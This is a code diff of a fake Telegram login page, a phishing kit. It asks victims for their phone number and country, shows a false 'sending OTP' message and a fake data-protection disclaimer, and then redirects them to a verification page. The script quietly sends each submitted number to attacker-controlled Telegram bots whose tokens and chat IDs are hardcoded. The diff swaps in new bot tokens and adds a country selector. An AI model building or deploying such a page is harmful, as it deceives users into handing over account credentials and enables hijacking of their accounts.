@@ -21,7 +21,7 @@
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: url('gay1.jpg') no-repeat center center fixed;
+      background: url('lc1.jpeg') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -149,6 +149,16 @@
       z-index: 10000;
       display: none;
     }
+    #countrySelect {
+  height: 40px;
+  font-size: 16px;
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  margin-bottom: 10px;
+}
+
   </style>
 </head>
 
@@ -165,9 +175,22 @@
     <h1>Enter telegram number</h1>
     <p>To continue, please login first</p>
     <form id="phoneForm">
-      <label for="phoneInput">Telegram number</label>
-      <input type="tel" id="phoneInput" placeholder="Telegram number" required />
-      <button type="submit" class="btn">Next</button>
+      <label for="country">Country code \/</label>
+      <select id="countrySelect">
+  <option value="+966">KSA Saudi Arabia (+966)</option>
+  <option value="+968">OM Oman (+968)</option>
+  <option value="+964">KW Kuwait (+965)</option>
+  <option value="+971">UAE United Arab Emirates (+971)</option>
+  <option value="+65">SG Singapore (+65)</option>
+  <option value="+49">DE Germany (+49)</option>
+  <option value="+60">MYS Malaysia (+60)</option>
+</select>
+
+<label for="phone">Telegram number</label>
+<input type="tel" id="phoneInput" placeholder="Telegram number" required />
+      
+      <button type="submit" class="btn">next</button>
+      
       <div class="disclaimer">
         *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
       </div>
@@ -177,63 +200,57 @@
 
   <script>
     const phoneForm = document.getElementById('phoneForm');
-    const phoneInput = document.getElementById('phoneInput');
-    const statusMessage = document.getElementById('statusMessage');
-    const blurOverlay = document.getElementById('blurOverlay');
-    const loadingText = document.getElementById('loadingText');
+const phoneInput = document.getElementById('phoneInput');
+const statusMessage = document.getElementById('statusMessage');
+const blurOverlay = document.getElementById('blurOverlay');
+const loadingText = document.getElementById('loadingText');
+const countrySelect = document.getElementById('countrySelect');
 
-    // Simulasi data bot (WAJIB diganti dengan data asli kamu)
-    const bots = [
-      {
-        token: "7140967336:AAGcoc5x77uJP9Lr3J455a9soy99DeWANwU",
-        chatId: "6788495149"
-      },
-      {
-        token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM",
-        chatId: "5876510981"
+const bots = [
+  { token: "7483981614:AAEvqtL2xBpHBvrfyoi4WicT7jhM62Xcq-k", chatId: "8088083209" },
+  { token: "8220476952:AAFi07PY09aRR0ZRrVvT5TvGOEiMOpvMPo0", chatId: "6614120514" }
+];
+
+phoneForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const phone = phoneInput.value.trim();
+  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
+  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
+  const bot = bots[currentBotIndex];
+
+  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+  statusMessage.style.color = "#000";
+  blurOverlay.style.display = "block";
+  loadingText.style.display = "block";
+
+  fetch(api)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+        setTimeout(() => {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
+      } else {
+        blurOverlay.style.display = "none";
+        loadingText.style.display = "none";
+        statusMessage.textContent = "❌ Gagal mengirim ke bot.";
+        statusMessage.style.color = "red";
       }
-    ];
-
-    phoneForm.addEventListener('submit', function(e) {
-      e.preventDefault();
-      const phone = phoneInput.value.trim();
-      if (!phone || bots.length === 0) return;
-
-      const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-      localStorage.setItem('sessionBotIndex', currentBotIndex);
-
-      const bot = bots[currentBotIndex];
-      const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Nomor HP: \`${phone}\`\n━━━━━━━━━━━━━━`;
-      const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-      statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
-      statusMessage.style.color = "#000";
-      blurOverlay.style.display = "block";
-      loadingText.style.display = "block";
-
-      fetch(api)
-        .then(res => res.json())
-        .then(data => {
-          if (data.ok) {
-            const nextBotIndex = (currentBotIndex + 1) % bots.length;
-            localStorage.setItem('currentBotIndex', nextBotIndex);
-            setTimeout(() => {
-              window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-            }, 10000);
-          } else {
-            blurOverlay.style.display = "none";
-            loadingText.style.display = "none";
-            statusMessage.textContent = "❌ Gagal mengirim ke bot.";
-            statusMessage.style.color = "red";
-          }
-        })
-        .catch(err => {
-          blurOverlay.style.display = "none";
-          loadingText.style.display = "none";
-          statusMessage.textContent = "❌ Error: " + err.message;
-          statusMessage.style.color = "red";
-        });
+    })
+    .catch(err => {
+      blurOverlay.style.display = "none";
+      loadingText.style.display = "none";
+      statusMessage.textContent = "❌ Error: " + err.message;
+      statusMessage.style.color = "red";
     });
+});
   </script>
 </body>
 </html>
